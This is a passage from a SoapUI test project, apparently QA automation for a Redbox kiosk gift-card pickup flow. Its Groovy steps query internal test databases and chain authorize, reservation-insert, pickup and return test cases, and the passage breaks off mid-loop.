</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>06fc4b16-ea98-4938-a65c-fa1ab201084a</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>6e09872e-ca9b-4316-9bd8-39d76a546ade</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="2de8cfee-d301-4a76-ad14-e89fde27a0f7" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="GiftCard-Pickup" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="85eb0a57-7448-4dcb-bc6e-921217f0b64e"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:assertion type="JDBC Status" id="e7a3f403-20b0-4593-81c5-1aceb211b870" name="JDBC Status"/><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="95fc9e99-c083-4aef-922b-6b519db9c388"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Data Connection"><con:configuration><Connection>QaAutomation( QAInt )</Connection><query>Select 
	KS_GiftCard.ID As ID, 
	KS_GiftCard.Scenario As Scenario, 
	KS_GiftCard.Email As Email, 
	KS_GiftCard.CreditCardNumber As Ccnumber, 
	KS_GiftCard.CreditCardType As CCType, 
	KS_GiftCard.GCPin As GCPin, 
	KS_GiftCard.PromoCode As PromoCode,
	KS_GiftCard.PromoValue As PromoValue, 
	KS_GiftCard.KioskID As KioskID, 
	KS_GiftCard.RentalFormats As rentalFormats, 
	KS_GiftCard.NumberOfRentals As numOfRentals, 
	KS_GiftCard.RentalVendStatus As RentalVendStatus, 
	KS_GiftCard.PurchaseFormats As PurchaseFormats, 
	KS_GiftCard.NumberOfPurchases As numOfPurchases, 
	KS_GiftCard.PurchaseVendStatus As PurchaseVendStatus, 
	KS_GiftCard.SetDaysBack As SetDaysBack,
	KS_GiftCard.LoyaltyFlag As LoyaltyFlag
From KS_GiftCard</query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>GCPin</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>LoyaltyFlag</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="665f0cc1-6619-4b90-8a1e-687dfc86b4bd"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("--------------------------------" + context.testCase.name + "------------------------------");
log.info ("Scenario [$ScenarioNo]:Reservation:  " + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );
def GCPin = context.expand( '${DataSource#GCPin}' );

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason


//Get CustomerProfile Info.
def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
getCP.setPropertyValue("CardHashId",encryptCC.getPropertyValue("CardID"));
def getCPrunner = getCP.run( null, false );	
// show that it worked out ok
log.info("Status: $getCPrunner.status, time taken for TestCase was: $getCPrunner.timeTaken ms");
// assert that it didn't fail
assert getCPrunner.status != Status.FAILED : getCPrunner.reason

//Get CustomerProfileNumber
def CustomerProfileNumber = getCP.getPropertyValue("CpCustomerNumber");
testRunner.testCase.setPropertyValue("CustomerProfileNumber",CustomerProfileNumber);
def CustomerID = getCP.getPropertyValue("CustomerId");
def CardAccountID = getCP.getPropertyValue("CardAccountId");
//Deleting the records from CustomerDisc to avoid below error
//Found an existing CustomerDisc record for disc: XXXXX, matching customer: XXXXXX!  Echo message, rolling back reconcile
log.info("Number of customerdisc records deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in ($CustomerID)"));

//Clear Open Rental and Reservations
def runCleanCustomer = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Cleanup Open Transactions"];
runCleanCustomer.setPropertyValue("CustomerId",CustomerID);
runCleanCustomer.setPropertyValue("kioskID",kioskID);
def CleanCustomerrunner = runCleanCustomer.run( null, false );	
// show that it worked out ok
log.info("Status: $CleanCustomerrunner.status, time taken for TestCase [Cleanup Open Transactions] was: $CleanCustomerrunner.timeTaken ms");
// assert that it didn't fail
assert CleanCustomerrunner.status != Status.FAILED : CleanCustomerrunner.reason

//Create Credits.
if (CustomerProfileNumber != "" &amp;&amp; UseCredits == '2' &amp;&amp; IsOffline != "true")
{
	def generateCredits = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Set Up Credits"];
	generateCredits.setPropertyValue("CpCustomerNumber",CustomerProfileNumber);
	generateCredits.setPropertyValue("DVDCreditQty",context.expand( '${DataSource#DVDCredits}' ));
	generateCredits.setPropertyValue("MovieCreditQty",context.expand( '${DataSource#MovieCredits}' ));
	generateCredits.setPropertyValue("GameCreditQty",context.expand( '${DataSource#GameCredits}' ));

	def generateCreditsrunner = generateCredits.run( null, false );	
	// show that it worked out ok
	log.info("Status: $generateCreditsrunner.status, time taken for TestCase was: $generateCreditsrunner.timeTaken ms");
	// assert that it didn't fail
	assert generateCreditsrunner.status != Status.FAILED : generateCreditsrunner.reason

	log.info ("Successfully Created Credits");
}
else
{
	log.info ("No credits required for the testCase or CustomerProfileNumber is NULL");
}

//Reload GiftCard
def reloadTC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["ReloadGiftCard"];

for(int j=0;j&lt;reloadTC.getPropertyCount();j++)
{
  reloadTC.getPropertyAt(j).setValue("");
}

reloadTC.setPropertyValue("CardAccountID",CardAccountID.toString());
reloadTC.setPropertyValue("CardExists",'1');
reloadTC.setPropertyValue("CardNumber",ccNumber.toString());
reloadTC.setPropertyValue("GCPin",GCPin.toString());
def reloadTCrunner = reloadTC.run( null, false );	
// show that it worked out ok
log.info("Status: $reloadTCrunner.status, time taken for TestCase [ReloadGiftCard] was: $reloadTCrunner.timeTaken ms");
// assert that it didn't fail
assert reloadTCrunner.status != Status.FAILED : reloadTCrunner.reason

</script></con:config></con:testStep><con:testStep type="groovy" name="Authorize" id="7dc7d38d-3fbb-4120-9b78-42e6f50af68d"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
//Cleaning up the properties; set the values to NULL before the start

for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}

tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("CCNumber", context.expand( '${DataSource#Ccnumber}' ));
tc.setPropertyValue("CCType", context.expand( '${DataSource#CCType}' ));
tc.setPropertyValue("PromoCode", context.expand( '${DataSource#PromoCode}' ));
tc.setPropertyValue("PromoValue", context.expand( '${DataSource#PromoValue}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("rentalFormats", context.expand( '${DataSource#rentalFormats}' ));
tc.setPropertyValue("numOfRentals", context.expand( '${DataSource#numOfRentals}' ));
tc.setPropertyValue("PurchaseFormats", context.expand( '${DataSource#PurchaseFormats}' ));
tc.setPropertyValue("numOfPurchases", context.expand( '${DataSource#numOfPurchases}' ));
tc.setPropertyValue("SetDaysBack", context.expand( '${DataSource#SetDaysBack}' ));
tc.setPropertyValue("LoyaltyFlag", context.expand( '${DataSource#LoyaltyFlag}' ));
tc.setPropertyValue("UseCredits", '0');//HardCoded to 0 since it there will be no credits in future
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("CustomerProfileNumber", context.expand( '${#TestCase#CustomerProfileNumber}' ));
tc.setPropertyValue("EnableServiceFee", "false");
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
tc.setPropertyValue("HasUpsell", "false");
tc.setPropertyValue("HasOffer", "false");
tc.setPropertyValue("MDVFlag", '');
tc.setPropertyValue("MDVDiscNumber",'');

//Check how to get the disc price

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [GCAuthorize] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","GCAuthorize $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="GenerateReferenceNumber" id="3940f58e-b698-4697-9978-f604ddbc452f"><con:settings/><con:config><script>//NOTES: Disabled extra logging; no need to delete them. 
import java.util.Date
import java.util.Calendar
import java.text.DecimalFormat;
import com.eviware.soapui.model.testsuite.TestRunner.Status;
//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def qaConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('QaAutomation');
def rbconstring = rbConObj.getConnectionString();
def qaconstring = qaConObj.getConnectionString();
//Define the Connection
def rbsql = Sql.newInstance(rbconstring);
def qasql = Sql.newInstance(qaconstring);

//Generate new sequenceNumber
def generateSequenceNumber = rbsql.call("exec [dbo].[rb_GetNextReferenceNumber]");

//Get SequenceNumber
def getSequenceNumber = qasql.firstRow("Select ReferenceNumber from QA_ReferenceNumber");
def ReferenceNumber = getSequenceNumber.ReferenceNumber.toString();
log.info ("ReferenceNumber:$ReferenceNumber");
testRunner.testCase.setPropertyValue("ReferenceNumber",ReferenceNumber.toString())

//Build SQL Query to Insert
//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
def TransactionID = authtc.getPropertyValue("TransactionID")
def BarcodeForTnx = authtc.getPropertyValue("BarcodeForTnx");
def tnxDetails = rbsql.firstRow("Select ProcessorTran_ID,ApprovalCode,Rent_Date as RentDate,KioskClient_ID,ProcessorDeclinedCode,Add_Verification_Res,RentalTaxRate,AuthAmount,Customer_ID,InvoiceID,GetDate() As DateTime From [Transaction] Where Transaction_ID = $TransactionID");
def ProcessorTranID = tnxDetails.ProcessorTran_ID.toString();
def ApprovalCode = tnxDetails.ApprovalCode.toString();
def KioskID = tnxDetails.KioskClient_ID.toString();
def ProcessorDeclinedCode = tnxDetails.ProcessorDeclinedCode.toString();
def AVSResponseCode = tnxDetails.Add_Verification_Res.toString();
def SalesTaxRate = tnxDetails.RentalTaxRate.toString();
def AuthAmount = tnxDetails.AuthAmount.toString();
def CustomerID = tnxDetails.Customer_ID.toString();
def InvoiceID = tnxDetails.InvoiceID.toString();
def LastDateTime = tnxDetails.DateTime.toString();
def RentDate = tnxDetails.RentDate.toString();
def Email = context.expand( '${DataSource#Email}' );

def getWebAccountInfo = rbsql.firstRow("Select WebAccountID from WebAccount Where EmailAddress = '$Email'");
def WebAccountID = getWebAccountInfo.WebAccountID.toString();

log.info ("Barcode: $BarcodeForTnx; TransactionID:$TransactionID")
log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="groovy" name="PickupValidation" id="a4f4719a-0981-4a07-b786-91805e2defd4"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["PickupValidation"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' )
def AccountNumber = context.expand( '${#TestCase#AccountNumber}' )

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("CustomerProfileNumber", CustomerProfileNumber);
tc.setPropertyValue("AccountNumber", AccountNumber);
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [PickupValidation] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
	testRunner.testCase.setPropertyValue("TestCaseStatus","PickupValidation $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","PickupValidation $tcStatus");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Pickup" id="ccb6fd7d-ea43-4681-9f30-a076d07a1e16"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Pickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", "false");//hardCoded
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["GCAuthorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("CardType", authtc.getPropertyValue("CCType"));

tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Pickup] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
	testRunner.testCase.setPropertyValue("TestCaseStatus","Pickup $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Pickup $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="8aced063-7b06-4ea3-918a-fdddac2ffeab"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Pickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())
//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
